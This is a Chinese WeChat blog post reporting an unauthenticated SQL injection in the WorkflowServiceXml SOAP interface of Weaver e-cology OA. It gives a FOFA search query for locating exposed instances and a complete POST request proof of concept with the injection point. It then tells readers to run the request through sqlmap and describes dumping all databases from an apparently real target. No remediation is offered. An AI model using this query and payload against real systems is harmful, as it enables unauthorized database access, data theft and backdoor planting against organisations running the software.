#  泛微ecology系统 WorkflowServiceXml 接口处存在SQL注入漏洞   
原创 V1xk  渗透小记   2024-07-30 20:44  
  
**欢迎来到**  
**渗透小记****公众号******  
  
**“**  
 免责声明：  
本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。”  
  
建议把 **渗透小记**  
 公众号设置为  
**星标**  
，这样能更快看到新的文章推送哦！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/IZfLlbROBibIP4KMM9Gibd4pIMBhn4Y8yOrYz3kSaib4icRf2p6bgClSaeJ1yuiaMyEvNoUayM5ygh9gUribek6WbQYQ/640?wx_fmt=jpeg "")  
  
**一、漏洞描述**  
  
**泛微e-cology依托全新的设计理念,全新的管理思想。为中大型组织创建全新的高效协同办公环境。智能语音办公,简化软件操作界面。身份认证、电子签名、电子签章、数据存证让合同全程数字化。该系统中 WorkflowServiceXml 接口处存在SQL注入漏洞，****未经授权的远程攻击者可以利用该漏洞执行任意SQL语句从而对数据库进行任意操作，包括植入后门木马等。******  
****  
  
****  
**二、空间测绘引擎**  
  
****  
**fofa语法：**  
```
app="泛微-协同办公OA"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IZfLlbROBibI7MNBwDa8AgCCwq8IKnghOiaP9YDH5iauzAfyrhmCepURyh0dIib9XFu1ZaKSjicjuAe7eGqIoBtG3CA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**三、漏洞复现**  
  
  
部分页面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IZfLlbROBibI7MNBwDa8AgCCwq8IKnghOIDF6EUNeMdNb5SGU9xSAouGNxx5uKOiaFGkJ9AbqDlHyicaVgicuNMWaQ/640?wx_fmt=png&from=appmsg "")  
  
**POC：**  
```
POST /services/WorkflowServiceXml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: text/xml
Accept-Encoding: gzip
Content-Length: 487

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
```  
  
此次记录涉及隐私，故上厚码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IZfLlbROBibI7MNBwDa8AgCCwq8IKnghOPdEIb2nqLJ0AIT3IowP4KSRa6hO24hk3egLuIXWsKpFQ9Mjf6Ecu3Q/640?wx_fmt=png&from=appmsg "")  
  
出现如上返回包可判断疑似出现SQL注入，直接扔进sqlmap里面跑就好，下面是跑出来的记录文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IZfLlbROBibI7MNBwDa8AgCCwq8IKnghO7gQD9lGCx7yicpoWxOtHprEbeoyOSC5SEN6pGGWIMLrFicpaYF1WGyfw/640?wx_fmt=png&from=appmsg "")  
  
继续深入，爆出来所有数据库。今天先这样，此次项目涉及隐私，不方便放太多图，见谅。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IZfLlbROBibI7MNBwDa8AgCCwq8IKnghOlCCohXcDP2rTYugxxFVia14VTMZaRa85ng75CkJ5uibJQehfq4NwxoLA/640?wx_fmt=png&from=appmsg "")  
  
****  
**写文章的目的在于记录与分享，如果喜欢的话可以点个关注哦，不定期会更新精彩内容！**  
  
  
